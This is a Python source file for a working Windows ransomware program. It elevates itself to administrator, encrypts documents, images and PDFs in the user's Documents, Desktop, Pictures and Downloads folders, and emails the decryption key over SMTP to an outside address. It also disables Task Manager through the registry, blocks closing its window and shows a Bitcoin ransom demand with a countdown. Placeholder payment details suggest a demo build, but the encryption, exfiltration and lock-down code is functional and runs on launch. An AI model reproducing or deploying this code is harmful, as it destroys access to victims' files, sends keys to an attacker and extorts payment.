import os
import sys
import tkinter as tk
from tkinter import messagebox, Canvas, Entry
from PIL import Image, ImageTk, UnidentifiedImageError
import threading
import time
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
import secrets
import base64
import winreg
import ctypes
from elevate import elevate
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


# Elevate the script to admin privileges if not already running as admin
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if not is_admin():
    elevate(show_console=False)

# Global variables
root = None  # Declare root as global variable
decryption_cipher = None  # Declare decryption cipher as global variable
key_entry = None  # Declare key_entry as global variable
time_left = None
ransomware_process = None  # Global variable to track the subprocess

# Get username
username = os.getlogin()

# Build list of directories to search
directories_to_search = [
    os.path.expanduser(f'~{os.sep}Documents'),
    os.path.expanduser(f'~{os.sep}Desktop'),
    os.path.expanduser(f'~{os.sep}Pictures'),
    os.path.expanduser(f'~{os.sep}Downloads')
]

# File extensions to encrypt
extensions_to_encrypt = ['.doc', '.docx', '.xls', '.xlsx', '.jpg', '.png', '.pdf', '.txt']

# Get the directory where the executable or script is located
if getattr(sys, 'frozen', False):  # Check if running as a bundled executable
    script_directory = os.path.dirname(sys.executable)
else:
    script_directory = os.path.dirname(__file__)

# Construct path to a file relative to the script's location
relative_file_path = os.path.join(script_directory, 'relative_file.txt')

print(f"The script or executable is located in: {script_directory}")
print(f"Path to a file relative to the script's location: {relative_file_path}")

# Path to logo file
logo_path = script_directory + "/logo.jpg"

print(logo_path)


def generate_salt(size=16):
    """Generate the salt used for key derivation, `size` is the length of the salt to generate"""
    return secrets.token_bytes(size)


def derive_key(salt, password):
    """Derive the key from the `password` using the passed `salt`"""
    kdf = Scrypt(salt=salt, length=32, n=2 ** 14, r=8, p=1)
    return kdf.derive(password.encode())


def load_salt():
    # load salt from salt.salt file
    return open("salt.salt", "rb").read()


def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    """Generates a key from a `password` and the salt.
    If `load_existing_salt` is True, it'll load the salt from a file
    in the current directory called "salt.salt".
    If `save_salt` is True, then it will generate a new salt
    and save it to "salt.salt" """
    if load_existing_salt:
        # load existing salt
        salt = load_salt()
    elif save_salt:
        # generate new salt and save it
        salt = generate_salt(salt_size)
        with open("salt.salt", "wb") as salt_file:
            salt_file.write(salt)
    # generate the key from the salt and the password
    derived_key = derive_key(salt, password)
    # encode it using Base 64 and return it
    return base64.urlsafe_b64encode(derived_key)


# Generate encryption key
password = "default_password"  # You can change this to use a secure password
key = generate_key(password)
cipher = Fernet(key)


# Function to encrypt a file
def encrypt_file(file_path):
    try:
        # Skip encryption for the logo file
        if os.path.abspath(file_path) == os.path.abspath(logo_path):
            print("Skipped: Logo file")
            return

        with open(file_path, 'rb') as file:
            file_data = file.read()
        encrypted_data = cipher.encrypt(file_data)
        with open(file_path, 'wb') as file:
            file.write(encrypted_data)
        print(f"Encrypted: {file_path}")
    except PermissionError:
        print(f"Failed to encrypt {file_path}: Permission denied")
    except Exception as e:
        print(f"Failed to encrypt {file_path}: {e}")


# Function to decrypt a file
def decrypt_file(file_path):
    global decryption_cipher
    try:
        with open(file_path, 'rb') as file:
            encrypted_data = file.read()
        decrypted_data = decryption_cipher.decrypt(encrypted_data)
        with open(file_path, 'wb') as file:
            file.write(decrypted_data)
        print(f"Decrypted: {file_path}")
    except PermissionError:
        print(f"Failed to decrypt {file_path}: Permission denied")
    except Exception as e:
        print(f"Failed to decrypt {file_path}: {e}")


# Function to start encryption process
def start_encryption():
    for directory in directories_to_search:
        if os.path.exists(directory):
            for root_dir, dirs, files in os.walk(directory):
                for file in files:
                    file_path = os.path.join(root_dir, file)
                    # Check if the file is eligible for encryption and skip logo file
                    if any(file.endswith(ext) for ext in extensions_to_encrypt) and os.path.abspath(
                            file_path) != os.path.abspath(logo_path):
                        encrypt_file(file_path)
    print(f'Files in specified directories have been encrypted.')
    print(f'The decryption key is: {key.decode()}')

    # Send the decryption key to the specified email
    send_decryption_key_via_email("tbd38438@vogco.com", key.decode())

    show_ransomware_window()


# Function to send the decryption key via email
def send_decryption_key_via_email(email_address, decryption_key):
    # Email server details
    smtp_server = "smtp.10minutemail.net"  # Update with your SMTP server
    smtp_port = 587  # Typically 587 for TLS
    sender_email = "dga57952@vogco.com"  # Update with your email address
    sender_password = ""  # Update with your email password

    # Email content
    subject = "Decryption Key"
    body = f"Your decryption key is: {decryption_key}"
    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = email_address
    msg["Subject"] = subject
    msg.attach(MIMEText(body, "plain"))

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()  # Secure the connection
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, email_address, msg.as_string())
            print(f"Decryption key sent to {email_address}")
    except Exception as e:
        print(f"Failed to send email: {e}")


# Function to display the ransomware window
def show_ransomware_window():
    global root, decryption_cipher

    root = tk.Tk()
    root.title("Ransomware Attack")

    # Set window size and position
    window_width = 800
    window_height = 645
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x = (screen_width // 2) - (window_width // 2)
    y = (screen_height // 2) - (window_height // 2)
    root.geometry(f"{window_width}x{window_height}+{x}+{y}")

    # Disable window close button
    root.protocol("WM_DELETE_WINDOW", disable_close_button)

    # Disable Task Manager
    disable_task_manager()

    # Main canvas with scrolling
    main_canvas = Canvas(root, bg='black')
    main_canvas.pack(fill=tk.BOTH, expand=True)

    scrollbar = tk.Scrollbar(main_canvas, orient=tk.VERTICAL, command=main_canvas.yview)
    scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
    main_canvas.configure(yscrollcommand=scrollbar.set)

    # Logo and header frame
    logo_frame = tk.Frame(main_canvas, bg='black')
    main_canvas.create_window((window_width // 2, 150), window=logo_frame, anchor=tk.CENTER)

    # Load and resize the logo image without the white border
    try:
        logo_image = Image.open(logo_path)
        logo_image = logo_image.resize((350, 200), Image.LANCZOS)
        logo_photo = ImageTk.PhotoImage(logo_image)

        # Display logo image with padding
        logo_label = tk.Label(logo_frame, image=logo_photo, bg='black')
        logo_label.image = logo_photo  # Keep a reference to avoid garbage collection
        logo_label.pack(pady=(0, 20))
    except FileNotFoundError:
        print(f"Logo file not found at: {logo_path}")
    except UnidentifiedImageError:
        print(f"Unable to identify image file at: {logo_path}")

    header_label = tk.Label(logo_frame, text="Your Files Have Been Encrypted!", font=("Helvetica", 24, "bold"),
                            fg='white', bg='black')
    header_label.pack(pady=(10, 20))

    # Payment instructions frame
    payment_frame = tk.Frame(main_canvas, bg='black')
    main_canvas.create_window((window_width // 2, window_height // 2 + 50), window=payment_frame, anchor=tk.CENTER)

    instructions = ("To decrypt your files, you need to pay 0.5 Bitcoin to the address below.\n"
                    "After payment, you will receive a decryption key to unlock your files.")
    tk.Label(payment_frame, text=instructions, font=("Helvetica", 14), fg='white', bg='black').pack(pady=(10, 20))

    bitcoin_frame = tk.Frame(payment_frame, bg='black')
    bitcoin_frame.pack(pady=(10, 20))
    tk.Label(bitcoin_frame, text="Send 0.5 Bitcoin to the following address:", font=("Helvetica", 12), fg='white',
             bg='black').pack()
    tk.Label(bitcoin_frame, text="1AB23C45D67EF89G0HI12JK34LMNOP56QR", font=("Helvetica", 12), fg='white',
             bg='black').pack()

    link = tk.Label(payment_frame, text="Payment Website", font=("Helvetica", 12), fg="blue", cursor="hand2",
                    bg='black')
    link.pack(pady=(5, 10))  # Adjusted padding to reduce the gap
    link.bind("<Button-1>", lambda e: messagebox.showinfo("Payment", "Go to https://fakepayment.com to pay."))

    global key_entry
    key_entry = Entry(payment_frame, width=40, font=("Helvetica", 10))
    key_entry.pack(pady=10)

    # Countdown timer frame
    global time_left
    time_left = 600  # 10 minutes
    timer_label = tk.Label(root, text="", font=("Helvetica", 14), bg='black', fg='white')
    timer_label.place(relx=0.5, rely=0.9, anchor=tk.CENTER)
    threading.Thread(target=countdown, args=(root, timer_label)).start()

    tk.Button(payment_frame, text="Submit", command=decrypt_files).pack(pady=(5, 20))

    tk.Button(payment_frame, text="Technical Support", command=show_support_window).pack(pady=(5, 20))

    root.mainloop()


# Function to decrypt files when key is submitted
def decrypt_files():
    global decryption_cipher
    decryption_key = key_entry.get()
    try:
        decryption_cipher = Fernet(decryption_key.encode())
        for directory in directories_to_search:
            if os.path.exists(directory):
                for root_dir, dirs, files in os.walk(directory):
                    for file in files:
                        if any(file.endswith(ext) for ext in extensions_to_encrypt):
                            file_path = os.path.join(root_dir, file)
                            decrypt_file(file_path)
        messagebox.showinfo("Decryption Complete", "All files have been decrypted.")
        root.destroy()  # Close the ransomware window after successful decryption
    except Exception as e:
        print(f"Decryption failed: {str(e)}")
        messagebox.showerror("Decryption Failed", "The entered key is incorrect. Please try again.")


# Function to display technical support window
def show_support_window():
    support_window = tk.Toplevel(root)
    support_window.title("Technical Support")
    tk.Label(support_window, text="Technical Support", font=("Helvetica", 12, "bold")).pack(pady=10)
    tk.Label(support_window, text="For help, contact us at support@fakemail.com", font=("Helvetica", 10)).pack(pady=10)
    tk.Button(support_window, text="Close", command=support_window.destroy).pack(pady=10)


# Function for countdown timer
def countdown(root, timer_label):
    global time_left
    while time_left > 0:
        mins, secs = divmod(time_left, 60)
        timer_label.config(text=f"Time left: {mins:02d}:{secs:02d}")
        time.sleep(1)
        time_left -= 1
    messagebox.showinfo("Time's Up!", "Time limit expired. Files will remain encrypted.")


# Function to disable window close button
def disable_close_button():
    messagebox.showwarning("Unauthorized Action",
                           "You cannot close this window until you pay the ransom or complete the action.")
    # To prevent closing the window, uncomment the line below
    root.protocol("WM_DELETE_WINDOW", disable_close_button)


# Function to disable Task Manager
def disable_task_manager():
    # Path to the explorer properties
    registry_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    # Name of the key
    registry_name = "DisableTaskMgr"
    # Value that the registry key is set to (1 to disable Task Manager)
    value = 1

    try:
        # Open the registry key, create it if it does not exist
        reg_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, registry_path)
        # Set the value to disable Task Manager
        winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_DWORD, value)
        # Close the key to save changes
        winreg.CloseKey(reg_key)
        print("Task Manager has been successfully disabled.")
    except WindowsError as e:
        print(f"There was an error setting the registry key: {e}")


start_encryption()
